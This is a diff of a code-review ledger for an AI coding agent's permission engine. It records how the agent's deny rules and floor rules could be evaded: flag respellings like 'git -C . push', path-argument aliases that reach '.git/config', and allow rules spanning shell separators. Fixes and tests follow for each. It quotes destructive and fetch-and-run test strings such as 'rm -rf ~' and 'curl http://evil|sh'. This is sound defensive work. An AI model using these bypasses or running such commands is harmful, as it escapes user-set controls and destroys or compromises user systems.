@@ -15,7 +15,7 @@ Status: `PENDING` · `IN PROGRESS` · `DONE` · `WONTFIX`
 > break, and the definition of done. You do not need any earlier session's
 > context to execute them.
 >
-> Everything below SECTION OPEN is the closed record — **all 75 findings**,
+> Everything below SECTION OPEN is the closed record — all 75 findings,
 > kept for the reasoning and the evidence, not because anything is owed.
 
 **Baseline at review start (measured, not assumed):**
@@ -37,8 +37,13 @@ turned out to be deliberate, test-asserted behaviour were dropped rather than re
 
 ## SECTION OPEN — what is left to do (read this first)
 
-**Everything in this file is now closed.** All 75 findings are `DONE`; the
-items below are kept as the record of the last three. Each is written to be
+**Everything in this file is closed.** Of the original 75 findings, 73 are
+`DONE` and two are `WONTFIX` by decision rather than neglect — CR-B3
+(closed in full 2026-08-21 by OPEN-1 and OPEN-4 together; its `WONTFIX`
+records the original decision, not the current state) and CR-X3 (the owner
+declined CI, and that is the one live `WONTFIX`). OPEN-4 was opened and
+closed on 2026-08-21 at the owner's request. The items below are the record
+of all four. Each is written to be
 executed by a session that has none of the context that produced it: the
 symptom, a runnable reproduction, the exact files, the decision that was
 deferred, the change to make, the tests that will break, and what "done"
@@ -47,8 +52,8 @@ means.
 **OPEN-1, OPEN-2 and OPEN-3 all closed 2026-08-21.** Each is kept below
 with its `DONE` row rather than moved, because the reproductions are the
 thing worth keeping — and OPEN-1 leaves one spelling evading deliberately,
-while OPEN-2 records three ways its own prescribed fix was wrong.
-**Nothing is open. All 75 findings are `DONE`.**
+while OPEN-2 and OPEN-4 each record ways their own prescribed fix was
+wrong. **Nothing is open and nothing is `PENDING`.**
 
 **Before starting anything here**, read `CLAUDE.md` §2 (session rules — in
 particular: record in this file *before* fixing, cite `file:line`, verify by
@@ -77,6 +82,11 @@ template ships believes commands are blocked that are not.
 > `git -C . push`, is left evading **on purpose** — see "What was measured"
 > at the end of this row. The reproduction below is kept as written so the
 > before/after is comparable.
+>
+> **Superseded the same day by OPEN-4**, which closes that sixth spelling
+> too, so every spelling in CR-B3 now denies. The "on purpose" reasoning below is still the right reasoning — it
+> is why OPEN-4 leaves `canonical_command` alone and adds a **deny-only**
+> family of respellings beside it rather than dropping flags inside it.
 
 **Reproduce** (no model, no network — this runs today):
 
@@ -449,6 +459,198 @@ the new test); `.venv/bin/ruff check src/ tests/` → `All checks passed!`;
 
 ---
 
+### OPEN-4 · A global flag before the subcommand still evades a deny rule — **`DONE`**
+
+**Severity:** Important. Same class as CR-B3, and the last member of it: a
+user who copies the deny block Rudra's own template ships believes pushes
+are blocked, and `git -C . push` pushes.
+
+**Opened 2026-08-21 at the owner's request**, after OPEN-1 closed the other
+six spellings and recorded this one as a deliberate cost. The owner read
+that cost and asked for it closed. **Design spec:**
+`docs/superpowers/specs/2026-08-21-deny-flag-canonicalisation-design.md`
+(`docs/` is gitignored per `.gitignore:216-227`, so the spec is local — this
+row carries everything needed to execute without it).
+
+**Reproduce** (no model, no network — measured on `main` at `eeae90e`):
+
+```python
+import tempfile
+from pathlib import Path
+from rudra.permissions.rules import PermissionEngine
+
+engine = PermissionEngine(
+    mode="auto", allow=(), deny=("execute:git push*",), floor_disable=(),
+    project_root=Path(tempfile.mkdtemp()), shell_in_auto=True,
+)
+for command in [
+    "git -C . push origin main",      # ALLOW  <- global flag, value-taking
+    "git --git-dir=.git push",        # ALLOW  <- global flag, `=` form
+    "git --no-pager push",            # ALLOW  <- global flag, no value
+    "git push origin main",           # deny
+]:
+    print(engine.decide("execute", {"command": command}).effect, command)
+```
+
+**Evidence.** `canonical_command` (`src/rudra/permissions/rules.py:258`)
+normalises the binary, the wrapper, whitespace and leading `NAME=value`
+assignments, but never flags — by design, and its docstring says so and
+names this exact case. `_denied_segment` (`:339`) matches a deny pattern
+against the raw segment and that one canonical form, so a flag between the
+binary and the subcommand defeats `execute:git push*`.
+
+**The constraint, which has not changed.** Dropping flags inside
+`canonical_command` would be **unsafe**, because that function is written to
+stay reachable from the allow side: `git -C /other/repo status` would reduce
+to `git status`, and `allow = ["execute:git status"]` would then authorise a
+*different repository*. OPEN-1 refused it for that reason and the reason
+still holds.
+
+**What to change.** Add `deny_spellings(segment) -> tuple[str, ...]` in
+`rules.py` and have `_denied_segment` match the pattern against each member;
+one hit denies. `canonical_command` and `_execute_matches`'s permissive
+branch are **untouched**. Four members, deduplicated:
+
+1. the raw segment,
+2. `canonical_command(segment)`, exactly as today,
+3. canonical **minus flag tokens**,
+4. canonical **minus flag tokens and each flag's value**.
+
+**Members 3 and 4 both exist because nothing in the string says whether a
+flag takes a value.** `git -C . push` needs the `.` consumed; `git
+--no-pager push` must not have `push` consumed. Distinguishing them needs
+per-command knowledge the gate does not have, so both readings are generated
+and either may match — two extra `fnmatch` calls instead of a table of every
+CLI's flags. Flag rules are shape-based: a token is a flag if it starts with
+`-` and is longer than one character (a bare `-` is an operand); a flag
+containing `=` carries its own value and never consumes the next token; in
+member 4 a flag consumes the next token only if that token is not itself a
+flag; a bare `--` ends flag processing. `argv[0]` is never stripped.
+
+**Why it is safe.** Deny-side only, so OPEN-1's own argument runs in our
+favour: canonicalisation drops information, so a pattern matched against it
+can only match **more**. On the deny side more is strictly safer — nothing
+blocked today becomes allowed, and no `allow` rule changes meaning because
+the permissive branch never sees these spellings. The accepted cost is
+**over-denial** (`deny = ["execute:git status"]` will also deny
+`git -C /other/repo status`); that is the correct reading, and where it is
+not, the failure is a visible denial the user can narrow rather than a
+silent authorisation.
+
+**Amendment, found while implementing 2026-08-21: two readings are not
+enough.** The four-member design above closes every case in its own table,
+and fails on a **mixed** command: `git -C . --no-pager push origin main`.
+With no flag eating its successor the reading is `git . push origin main`;
+with every flag eating one, `-C` takes `.` and `--no-pager` takes `push`,
+giving `git origin main`. The subcommand survives in neither, so the deny
+misses. The ambiguity is **per flag**, not per command, so a single
+all-or-nothing switch cannot express it.
+
+Fixed by generating one reading per **combination** of ambiguous flags. A
+flag is ambiguous only when it could go either way — it has no `=` and the
+token after it is not itself a flag; every other flag is unambiguous and
+never eats. `git -C . --no-pager push` has two ambiguous flags, so four
+readings, one of which is `git push origin main`. Bounded at **6** ambiguous
+flags (64 readings) with a fall back to the two extreme readings beyond
+that, and generated lazily so the common case — nought or one flag — still
+costs one or two `fnmatch` calls. Recorded rather than folded in silently
+because it is a hole in the design this row prescribed.
+
+**Prototyped 2026-08-21, 14/14**, including the over-denial guards:
+
+| pattern | command | denies? |
+|---|---|---|
+| `execute:git push*` | `git -C . push origin main` | **yes** (new) |
+| `execute:git push*` | `git --git-dir=.git push` | **yes** (new) |
+| `execute:git push*` | `git --no-pager push` | **yes** (new) |
+| `execute:git push*` | `C:\tools\git.exe -C . push` | **yes** (new) |
+| `execute:git push*` | `git log --oneline push_branch` | no |
+| `execute:git push*` | `git status` | no |
+| `execute:pip install*` | `pip download -r install.txt` | no |
+| `execute:npm test` | `npm --prefix /x test` | yes |
+| `execute:rm -rf *` | `rm -rf /tmp/x` | yes |
+
+Windows spellings need no new code: member 2 already turns
+`C:\tools\git.exe -C . push` into `git -C . push`, which 3 and 4 reduce.
+Shape, not `sys.platform` (`CLAUDE.md` §1 goal 8), so it is exercised on
+macOS.
+
+**Tests.** **Delete**
+`tests/test_permissions_rules.py::test_a_global_flag_before_the_subcommand_still_evades_deny`
+rather than working around it — its own docstring instructs exactly that.
+Add: the four new deny cases; every over-denial guard above; `--` ends flag
+processing; a bare `-` is an operand; unbalanced quotes fall back to the raw
+segment and deny nothing new. And the one that matters most — **the allow
+side is untouched**: with `allow = ["execute:git status"]` in **`ask` mode**,
+`git -C /other/repo status` must still come back `ask`. Written in `ask`
+mode deliberately: OPEN-1 recorded that the equivalent test in `auto` mode
+measured nothing, because the mode default allows every command there.
+
+**Also update** `config/template.py:89-94`, which currently teaches the
+hand-written workaround (`execute:git -* push*`). The flag spellings are
+caught after this change; the `allow`-side warning in that block still
+holds and must stay.
+
+**Done when:** `git -C . push` and `git --git-dir=.git push` both deny
+against `execute:git push*`; every over-denial guard still allows;
+`git -C /other/repo status` is still not authorised by
+`allow = ["execute:git status"]`; the pinned test is gone rather than
+worked around; the template no longer teaches a workaround that is no longer
+needed; `ruff check` clean and the full suite green.
+
+**FIXED 2026-08-21.** `deny_spellings` (`permissions/rules.py`) yields the
+raw segment, its `canonical_command`, and one flagless reading per
+combination of ambiguous options; `_denied_segment` matches the pattern
+against each and one hit denies. `canonical_command` and
+`_execute_matches`'s permissive branch are untouched, which is what keeps
+the allow side honest. `_flag_positions` and `_reading` carry the shape
+rules. `config/template.py` no longer teaches the hand-written workaround
+and now states the deny/allow asymmetry instead.
+
+**The amendment above was found by a test, not by review** — the
+two-reading design in this row's own prescription missed the mixed case,
+and the test asserting it failed. That is the second time in this ledger a
+prescribed fix was wrong in a way only execution caught (see OPEN-2).
+
+Verified — CR-B3's original reproduction, plus OPEN-4's additions, plus
+every guard:
+
+```
+deny   git push origin main            deny   git --git-dir=.git push
+deny   git  push origin main           deny   git --no-pager push
+deny   git -C . push origin main       deny   git -C . --no-pager push origin main
+deny   /usr/bin/git push origin main   deny   C:\tools\git.exe -C . push
+deny   sh -c 'git push origin main'
+deny   GIT_DIR=.git git push origin main
+deny   true && git push origin main
+
+allow  git log --oneline push_branch   allow  pip download -r install.txt
+allow  git status                      allow  cat -- --weird
+allow  git -C . status
+
+ask    git -C /other/repo status              <- allow side UNCHANGED
+ask    git --git-dir=/other/repo/.git status  <- (mode ask, allow=git status)
+```
+
+**Every spelling in CR-B3 now denies.** That finding is closed in full.
+
+**Tests.** `test_a_global_flag_before_the_subcommand_still_evades_deny` was
+**deleted**, as its docstring instructed. Five added to
+`tests/test_permissions_rules.py`:
+`test_a_global_flag_before_the_subcommand_now_denies`,
+`test_dropping_flags_does_not_turn_a_deny_into_a_ban_on_the_binary`,
+`test_the_allow_side_never_sees_a_flagless_spelling` (written in **`ask`**
+mode, for the reason this row gives),
+`test_flag_stripping_stops_at_a_double_dash_and_ignores_a_bare_dash`, and
+`test_an_unbalanced_quote_falls_back_to_the_raw_segment`. Four of the five
+passed before the change and after — they are guards, and that is the point.
+
+Measured: `uv run pytest -q` → **1749 passed, 2 skipped**;
+`.venv/bin/ruff check src/ tests/` → `All checks passed!`;
+`ruff format --check` → `260 files already formatted`.
+
+---
+
 ### Closed, but worth knowing before you touch these areas
 
 - **CR-X3 — no CI, by owner decision (2026-08-21).** Do not add a CI matrix
@@ -534,7 +736,7 @@ suite has only ever run on macOS.
 |---|---|---|---|
 | CR-B1 | **CRITICAL** | **`DONE`** | **`execute` allow rules and session grants match across shell separators — `execute:pytest*` is unrestricted command execution.** `permissions/rules.py:191` matches with `fnmatch.fnmatchcase`, whose `*` spans `;`, `&&`, `\|` and newlines; the command string is then run by `/bin/sh -c` (`deepagents/backends/local_shell.py:306`, `shell=True`, confirmed in the installed 0.7.4). **Reproduced against the shipped engine** with `mode="auto", shell_in_auto=False`: `'pytest -q; rm -rf ~'`, `'pytest && curl http://evil\|sh'` and `'pytest\nrm -rf /'` **all return `allow rule='execute:pytest*'`**. Two aggravations: (a) the allow loop (`rules.py:286-288`) returns *before* the `shell_in_auto` gate (`:302-303`), so this is the one way an unattended `--auto` run reaches arbitrary shell without `--allow-shell` — the exposure A1.49 was built to close; (b) `execute:pytest*` is the exact rule `CLAUDE.md` §6 advertises as an example. `suggest_grant` mints the same shape from a single approval (`approval.py:50` → `Rule("execute", f"{first[0]}*")`), so one "[A]lways" on `pytest -q` grants `pytest; <anything>` for the rest of the process. `tests/test_permissions_approval.py:70` asserts only the rule *text*, never what it matches — uncovered, not intended. <br><br>**FIXED 2026-08-21.** Fixed: `execute` patterns now match per shell segment (`rules.py::command_segments` + `_execute_matches`). A permissive rule (allow/grant) must cover EVERY segment and never matches a segment containing `$(`/`${`/backtick; a deny rule fires on ANY segment. `suggest_grant` mints the exact command, not `first*`, when the approved command is chained. Verified: `pytest -q` and `pytest -q; pytest -x` allow; `pytest -q; rm -rf ~`, `pytest && curl…|sh`, `pytest\nrm -rf /`, `pytest -q & rm -rf ~`, `pytest $(rm -rf ~)` all deny. Regression: `tests/test_permissions_rules.py::test_an_allow_rule_does_not_span_a_shell_separator` + `::test_a_deny_rule_fires_on_any_command_in_a_chain`. |
 | CR-B2 | **CRITICAL** | **`DONE`** | **`write_file`/`edit_file` path aliases (`path=`, `filename=`) bypass the deny floor and every deny rule.** `_ARG_KEYS` (`rules.py:95-106`) maps these tools to `"file_path"` only, so `gated_arg` returns `None` for any other spelling; `_resolve` then yields `(None, (), ())` and the floor short-circuits on `path is not None` (`floor.py:67`). Meanwhile `FixWriteParamsMiddleware` renames `filename`/`path` → `file_path` (`middleware/fix_write_params.py:77-80`) — **always on, never gated** — and it runs *inside* the gate, because the gate is installed outermost (`subagents/build.py:219` and `agent/planner_agent.py:386`, both `middleware.insert(0, …)`). The gate therefore decides on un-repaired args and the repair happens afterwards, before the tool runs. **Reproduced:** with `deny=("write_file:.env",)`, `{"file_path": ".env"}` → `deny`, but `{"path": ".env"}` and `{"filename": ".env"}` → **`allow` `src=mode-default`**; and `{"file_path": ".git/config"}` → `deny <floor:git-dir>` while `{"path": ".git/config"}` → **`allow`**. So `write_file(path=".git/config", …)` defeats the `git-dir` floor and can plant git config or hooks in the user's repo. In `ask` mode it is worse than silent: the decision is "ask", the prompt fires, but `diff.py:63` reads `args.get("file_path","")`, so the approval panel shows the write **with no path at all** — the user approves a write whose destination is not displayed. (Backend `virtual_mode=True` still confines it to the project root, so this is policy bypass inside the project, not host escape.) <br><br>**FIXED 2026-08-21.** Fixed: `gated_arg` now reads every spelling `FixWriteParamsMiddleware` accepts (`_ARG_ALIASES`), and `decide` fails **closed** — a mutating tool whose path argument is missing or non-string returns `deny <unresolvable-path>` instead of falling through to the mode default. Verified: `.env` and `.git/config` now deny under `file_path`, `path` and `filename` alike; `{}` and `{'file_path': 123}` deny as `fail-closed`; `ls(path=…)` unaffected. Regression: `tests/test_permissions_rules.py::test_a_path_alias_cannot_dodge_the_floor_or_a_deny_rule`. |
-| CR-B3 | **Important** | **`WONTFIX`** | **The shipped deny examples are trivially evaded — `execute:git push*` matches only one exact spelling.** `config/template.py:80` ships `deny = ["execute:git commit*", "execute:git push*", "execute:git reset --hard*"]`, matched raw with no normalisation of whitespace, argv position, or binary path. **Measured:** `'git push origin main'` → deny, but `'git  push origin main'` (two spaces), `'git -C . push origin main'`, `'/usr/bin/git push origin main'`, `"sh -c 'git push origin main'"` and `'true && git push origin main'` **all allow**. A user who copies the template's own deny block believes pushes are blocked; five of six semantically identical commands go through. Note the asymmetry with CR-B1 — for *allow*, `*` is too greedy; for *deny*, the literal prefix is too strict — and both live in the same `fnmatch` call. <br><br>**2026-08-21.** **WONTFIX for now — superseded in part, and the rest needs a design decision.** CR-B1's fix makes deny rules pierce shell chaining, so `true && git push` is now denied. The remaining evasions (`git  push` with two spaces, `git -C . push`, `/usr/bin/git push`) need argv normalisation — `shlex.split`, basename, skip leading options — which changes what every existing user rule matches. That is a behaviour change to ship deliberately, not fold into a bug-fix pass. The template's deny block should carry a caveat until then. |
+| CR-B3 | **Important** | **`WONTFIX`** | **The shipped deny examples are trivially evaded — `execute:git push*` matches only one exact spelling.** `config/template.py:80` ships `deny = ["execute:git commit*", "execute:git push*", "execute:git reset --hard*"]`, matched raw with no normalisation of whitespace, argv position, or binary path. **Measured:** `'git push origin main'` → deny, but `'git  push origin main'` (two spaces), `'git -C . push origin main'`, `'/usr/bin/git push origin main'`, `"sh -c 'git push origin main'"` and `'true && git push origin main'` **all allow**. A user who copies the template's own deny block believes pushes are blocked; five of six semantically identical commands go through. Note the asymmetry with CR-B1 — for *allow*, `*` is too greedy; for *deny*, the literal prefix is too strict — and both live in the same `fnmatch` call. <br><br>**2026-08-21.** **WONTFIX for now — superseded in part, and the rest needs a design decision.** CR-B1's fix makes deny rules pierce shell chaining, so `true && git push` is now denied. The remaining evasions (`git  push` with two spaces, `git -C . push`, `/usr/bin/git push`) need argv normalisation — `shlex.split`, basename, skip leading options — which changes what every existing user rule matches. That is a behaviour change to ship deliberately, not fold into a bug-fix pass. The template's deny block should carry a caveat until then. <br><br>**Closed 2026-08-21 by OPEN-1 and OPEN-4.** OPEN-1 denied five of the six spellings above; OPEN-4 closed the sixth, `git -C . push`, along with `--git-dir=` and `--no-pager` forms. **All six now deny.** The `WONTFIX` here records the original decision, not the current state. |
 | CR-B4 | **Important** | **`DONE`** | **The engine reads model-supplied absolute paths as host paths; the backend reads them as virtual paths rooted at the project.** `rules.py:235` `given = candidate if candidate.is_absolute() else self.project_root / candidate`. But every backend Rudra builds is `virtual_mode=True` (`agent/main_agent.py:439-448`) and deepagents resolves `/x` as `<root>/x` (`backends/filesystem.py:203-215`), while its own tool schema instructs the model "Absolute path … Must be absolute, not relative" (`middleware/filesystem.py:1132`). So a model that *obeys the tool description* and calls `write_file("/src/app.py", …)` — a write that would land at `<project>/src/app.py` — is denied `<floor:outside-root>`, and `outside-root` is the one floor rule config refuses to let you disable. `permissions/diff.py:32-34` repeats the mistake, so under `ask` the approval panel stats and previews `/src/app.py` **on the host** — the wrong file — while the write goes to `<project>/src/app.py`. Every permissions test uses relative paths, so this shape is uncovered. <br><br>**2026-08-21 — CONFIRMED, NOT FIXED. This one needs an owner decision, not a patch.** The mismatch is real and measured: `FilesystemBackend(virtual_mode=True).write("/etc/passwd", ...)` lands at `<project>/etc/passwd` and the host file is untouched — verified directly against the installed backend — while the engine denies that call `<floor:outside-root>`. So the gate and the backend genuinely disagree, and the approval panel previews the wrong file. **But the fix changes what `outside-root` means.** A patch was written and reverted: rewriting a non-project absolute path to project-relative made `write_file("/etc/passwd")` **allow**, which broke five tests that pin the current contract deliberately — `test_the_floor_holds_under_auto_mode`, `test_a_deny_on_a_symlinked_system_path_still_fires`, `test_an_anchored_pattern_matches_the_absolute_path`, `test_a_disabled_floor_rule_is_still_reported_in_the_source`, `test_the_floor_denies_even_in_auto_mode` — and contradicts `CLAUDE.md` §6, which documents that a pattern starting with `/` matches the resolved absolute path. Note the failure direction of today's behaviour is **safe**: it denies a legitimate write rather than permitting an illegitimate one. Two coherent options: **(a)** make the engine mirror the backend (paths become virtual, `outside-root` becomes advisory-only for filesystem tools, and A1.50's "the backend confines writes, not this rule" becomes literal), or **(b)** keep the floor as the visible contract and instead teach the coder prompt to write project-relative paths, so the model never emits the shape that trips it. (a) is more honest about what actually happens; (b) preserves a security signal users can read. Either way it ships as its own change with the tests rewritten to state the chosen contract. <br><br>**FIXED 2026-08-21 — option (a), owner's decision.** The gate now resolves a path the way the backend will, through one shared function: `compat/virtual_paths.py::virtual_to_relative`. Every backend is `virtual_mode=True`, so a leading `/` is the project root — `/etc/passwd` is `<project>/etc/passwd` and the host's file is untouched, measured against the pinned backend. Three consumers, one answer: the gate (`permissions/rules.py`), the approval preview (`permissions/diff.py`), and the backend itself via `route_prefixes()`, which `build_gate` now takes so mounts (`/artifacts/`, `/skills/`) are not rewritten as project content. <br><br>**What changed, precisely.** `outside-root` now fires on a *real* escape — `../..` traversal, or a symlink inside the project pointing out — and no longer on a virtual absolute path, which never left the project to begin with. Verified: `../../etc/hosts`, `src/../../../etc/hosts` and a symlink out all still deny `<floor:outside-root>`; `/src/app.py` and `/etc/passwd` allow. `/.git/config` now denies as `<floor:git-dir>` rather than `outside-root` — the *more* precise rule, where before the imprecise one masked it. <br><br>**Rules did not change.** `rule_matches` is now offered three spellings — the model's own, the project-relative, and the resolved host path — so a rule authored `write_file:/etc/**` keeps firing exactly as its author meant. Rules can only gain matches, so deny is strictly stronger; the floor is unaffected because it is handed the resolved path alone and never a spelling. <br><br>**Cross-platform, per the owner's requirement.** `virtual_to_relative` resolves by path SHAPE, not host OS, because the model guesses its style from training data rather than the machine: `C:\proj\src\app.py`, `\\server\share\app.py`, `src\app.py`, `\src\app.py` and `/src/app.py` all resolve on Windows, macOS and Linux alike. 14 tests in `tests/test_virtual_paths.py` pin this and are host-independent. <br><br>**Verified end-to-end through a real graph**, not just unit tests: a model emitting `write_file("/src/app.py")` against a real `FilesystemBackend(virtual_mode=True)` with the real middleware returns `status=success`, the file lands at `<project>/src/app.py`, and the host `/src` does not exist. Five tests that pinned the old host-path contract were rewritten to state the new one, with the reasoning in their docstrings; `CLAUDE.md` §6 and §3 updated. |
 | CR-B5 | Minor | **`DONE`** | **A deny rule naming a control-plane or wrapped-execute tool parses cleanly and is silently ignored.** `rules.py:248-254` returns `allow` for `CONTROL_PLANE_TOOLS` and `WRAPPED_EXECUTE_TOOLS` *before* the user-deny loop at `:275`, yet `parse_rule` accepts those names because `ALL_GATED_TOOLS` (`:85-87`) includes both sets. **Measured:** `deny = ["remember", "record_fact", "run_tests", "git_diff"]` → all four `allow`. A user who writes `deny = ["remember"]` to stop the agent writing to the memory palace gets a config that validates, prints no warning, and has no effect. <br><br>**FIXED 2026-08-21.** Fixed: `RULEABLE_TOOLS` (`ALL_GATED_TOOLS` minus control-plane minus wrapped-execute) is now the set `parse_rule` accepts and the set its error message lists, and naming an unruleable tool raises with the reason. Regression: `tests/test_permissions_rules.py::test_a_rule_naming_a_tool_it_cannot_affect_is_refused`. |
 | CR-B6 | Minor | **`DONE`** | **`floor-disabled` attribution is lost in `ask` and `plan` mode.** `rules.py:311-313` returns from the `plan`/`ask` branches without the `_final` wrapper (`:269-272`) that stamps `source="floor-disabled"` on a suppressed floor hit. `disabled_floor_notice` (`permissions/__init__.py:124-127`) promises "Calls they would have blocked are still recorded in the audit log." **Measured** with `floor_disable=("git-dir",)`: `mode="auto"` → `source='floor-disabled'`, `mode="ask"` → `source='mode-default'`, and the middleware records nothing for an `ask` (`middleware.py:107-110`), so the audit log holds no trace that a floor rule was violated and suppressed. Only the auto path is tested (`tests/test_permissions_rules.py:172-188`). <br><br>**FIXED 2026-08-21.** Fixed: `_final` stamps the suppressed floor rule on **every** effect, and the `plan`/`ask` branches route through it. Verified: `floor_disable=("git-dir",)` now reports `source='floor-disabled'` with `rule='<floor:git-dir>'` in all three modes, not just `auto`. |
@@ -551,7 +753,7 @@ suite has only ever run on macOS.
 | CR-C3 | **Important** | **`DONE`** | **Every subagent's memory recall searches for its own name, never for the task.** `subagents/build.py:134` `query = getattr(context, "task", "") or spec.name`. **`SubagentContext` has no `task` field** — enumerated at runtime: `['project_path','backend','gate','console','cfg','checkpointer','session_id','facts','skills_sources','usage','mcp','memory','trace']` (`subagents/runner.py:63`), and no assignment to `context.task` exists anywhere in `src/`. So the query is always the literal `"coder"` / `"tester"` / `"general-purpose"`. The coder's recall block — justified in the surrounding comment as "a memory recorded during task 1 reaches task 2's coder" — is the 8 palace entries nearest the *word* "coder", identical for every task in every run, and `usage.record_recall` (`:143`) bills it as recall spend. `run_subagent` receives the real task text as `prompt`; the context never carries it. <br><br>**FIXED 2026-08-21.** Fixed: `run_subagent` passes the invocation prompt through `build_agent` to `_prompt_for`, which uses it as the recall query. Regression: `tests/test_memory_wiring.py::test_the_recall_query_is_the_task_not_the_subagent_name`. |
 | CR-C4 | **Important** | **`DONE`** | **The gate's blocker text is computed, then thrown away before the planner is consulted on a block.** `engine.py:288` computes `blocker_text = _blocker_text(report)`, but it is only ever fed back to the *coder* (`_coder_prompt`, `:165`). Both `BLOCKED` exits overwrite `task.note` with a content-free string: `"no progress: the same failure twice"` (`:291`) and `f"{task.attempts} attempts exhausted"` (`:299`). `work()` then calls `planner(..., reason="blocked", task=task)` and `consult_planner` interpolates that note verbatim (`planner_agent.py:606-610`), so the planner is asked to re-plan around a failure it is told nothing about: *"Task t1 (write the parser) failed and was given up on:\n\n3 attempts exhausted\n\nAdd a task taking a DIFFERENT approach."* `record_block_memory` (`:449`) files the same empty reason into the palace, defeating its own docstring ("Bug-to-fix pairs are what make this worth storing"). `tests/test_planner_consult.py:61` hand-sets a realistic note and asserts "the blocker goes back verbatim" — the engine never produces such a note, so the test covers only the prompt template. <br><br>**FIXED 2026-08-21.** Fixed: both `BLOCKED` paths now append `blocker_text` to `task.note`, so `consult_planner` and `record_block_memory` receive the actual failure instead of "3 attempts exhausted". |
 | CR-C5 | **Important** | **`DONE`** | **`verify_project` blocks the event loop, so neither Ctrl-C press does anything during verification.** `_verify` (`engine.py:193-201`, called at `:258` and `:273`) is a plain synchronous function that reaches `subprocess.Popen` in `shell/runner.py:120` with `test_timeout` (default 600 s), called from `async def run_task`. `_cancel_on_sigint` (`cli.py:294-340`) installs the handler via `loop.add_signal_handler`, whose callback runs only when the loop regains control. So during a 10-minute `pytest` the first Ctrl-C does nothing **and** the second press's `os._exit(EXIT_CANCELLED)` — the escape hatch whose docstring says "A cancel that itself hangs must not need a kill from another terminal" — is equally deferred. Deferral confirmed directly with a pty harness: `HANDLER FIRED -> cancel` printed only after the blocking call returned. Fix: `await asyncio.to_thread(verify_project, ...)`. (`MemoryStore.write`/`search` at `:428` and `build.py:135` are the same shape — ONNX embedding on the loop thread — but far shorter.) <br><br>**FIXED 2026-08-21.** Fixed: `_verify` is `async` and runs `verify_project` via `asyncio.to_thread`, so the event loop can service the SIGINT callback while a subprocess runs. Both call sites await it. |
-| CR-C6 | Minor | **`DONE`** | **`ask_approval`'s "Ctrl-C is cancel" branch is unreachable under the shipping CLI.** `loop/plan_view.py:100` catches `(EOFError, KeyboardInterrupt)`, and its docstring calls the EOF/Ctrl-C asymmetry "the one safety property this function has." But `Prompt.ask` blocks on `input()` inside the asyncio task while `_cancel_on_sigint` has replaced the default SIGINT handler, so SIGINT no longer raises `KeyboardInterrupt`. **pty repro of the exact configuration:** Ctrl-C at 1.5 s was swallowed, the typed answer was consumed (`GOT LINE: 'hello'`), and the handler fired only after `input()` returned. So at the `[a]pprove [r]evise [c]ancel` prompt Ctrl-C prints nothing and the prompt keeps waiting. The safety property survives by accident — the deferred `task.cancel()` lands at the first `await` in `work()` — but the prompt is unresponsive and the second-press force-exit is deferred too. <br><br>**2026-08-21.** **Partly fixed by CR-C5.** With verification off the loop, the cancel callback now fires during a run rather than after it. The prompt itself still blocks the loop inside `input()`; moving `ask_approval` to a thread is a separate change to the approval path and is left for a deliberate pass. |
+| CR-C6 | Minor | **`DONE`** | **`ask_approval`'s "Ctrl-C is cancel" branch is unreachable under the shipping CLI.** `loop/plan_view.py:100` catches `(EOFError, KeyboardInterrupt)`, and its docstring calls the EOF/Ctrl-C asymmetry "the one safety property this function has." But `Prompt.ask` blocks on `input()` inside the asyncio task while `_cancel_on_sigint` has replaced the default SIGINT handler, so SIGINT no longer raises `KeyboardInterrupt`. **pty repro of the exact configuration:** Ctrl-C at 1.5 s was swallowed, the typed answer was consumed (`GOT LINE: 'hello'`), and the handler fired only after `input()` returned. So at the `[a]pprove [r]evise [c]ancel` prompt Ctrl-C prints nothing and the prompt keeps waiting. The safety property survives by accident — the deferred `task.cancel()` lands at the first `await` in `work()` — but the prompt is unresponsive and the second-press force-exit is deferred too. <br><br>**2026-08-21.** **Partly fixed by CR-C5.** With verification off the loop, the cancel callback now fires during a run rather than after it. The prompt itself still blocks the loop inside `input()`; moving `ask_approval` to a thread is a separate change to the approval path and is left for a deliberate pass. <br><br>**Closed 2026-08-21 as OPEN-2.** That deliberate pass happened: the prompt now runs on a daemon thread and Ctrl-C prints while it is open. See the OPEN-2 row for the three ways the prescribed one-line fix turned out to be wrong. |
 | CR-C7 | Minor | **`DONE`** | **`work()`'s blocked→consult→new-task cycle has no bound.** `engine.py:692-695`: on `Outcome.BLOCKED` it sets `consulted_on_empty = False` and consults the planner again. `consulted_on_empty` is the only loop bound and every block resets it; `max_fix_attempts` bounds one task, nothing bounds the number of tasks. A planner that answers each "Add a task taking a DIFFERENT approach" with `add_tasks` produces a task that blocks, which consults it again, indefinitely — `max_fix_attempts` coder invocations plus a planner call per cycle, with Ctrl-C as the user's only exit. `grep` finds no `max_tasks` or iteration cap anywhere in `src/rudra/`. <br><br>**FIXED 2026-08-21.** Fixed: `MAX_BLOCKED_CONSULTS = 5` bounds the blocked→consult→new-task cycle, and the run stops with a message naming how many tasks blocked (`loop/engine.py`). |
 | CR-C8 | Minor | **`DONE`** | **Each planner stage runs the same palace search twice; the "already cached" justification is false.** `planner_agent.py:409-414` calls `memory.search(task, limit=8)` after `build_planner_prompt` already did so at `:152`, with a comment claiming "the search is already cached by the store's open collection". `MemoryStore.search` (`memory/store.py:175-222`) caches nothing — `_open()` caches the *collection handle*; every call re-runs `search_memories`, i.e. a fresh ChromaDB/ONNX MiniLM embedding plus a `collection.get`. `create_main_agent` builds all three stages up front (`main_agent.py:698-719`), so a run pays 6 embeddings instead of 3, synchronously, during construction. <br><br>**FIXED 2026-08-21.** Fixed: `build_planner_prompt` takes `usage` and records the recall spend where the search already happened; the caller's second `memory.search` is gone. Verified: one search per stage, was two — so a run pays 3 embeddings, not 6. |
 | CR-C9 | Minor | **`DONE`** | **`create_main_agent` leaks the aiosqlite connection when construction fails after it opens.** `main_agent.py:597` opens `db_conn` with no `try/except` around `:597-758`. `RudraAgent.close()` is the only thing that closes `db_conn`, `mcp_client` and `transcript`, and it is unreachable if the factory raises — and anything after `:597` can: `checkpointer.setup()`, `TranscriptWriter(...)` (`:641`), or `create_planner_agent` → `build_model("planner")`, which raises on any configuration error. In the REPL `create_main_agent` runs once per input (`cli.py:1455`) and the surrounding `except` clauses catch only `CancelledError`/`KeyboardInterrupt`/`EOFError`, so a misconfigured run leaks a connection, its aiosqlite thread, and an open transcript handle **per attempt**. <br><br>**FIXED 2026-08-21.** Fixed: everything after `aiosqlite.connect` runs inside `try/except BaseException`, which closes the connection and re-raises (`agent/main_agent.py`). Verified by forcing `AsyncSqliteSaver` to raise: the error propagates and the connection's thread is stopped rather than leaked. |
@@ -584,7 +786,7 @@ suite has only ever run on macOS.
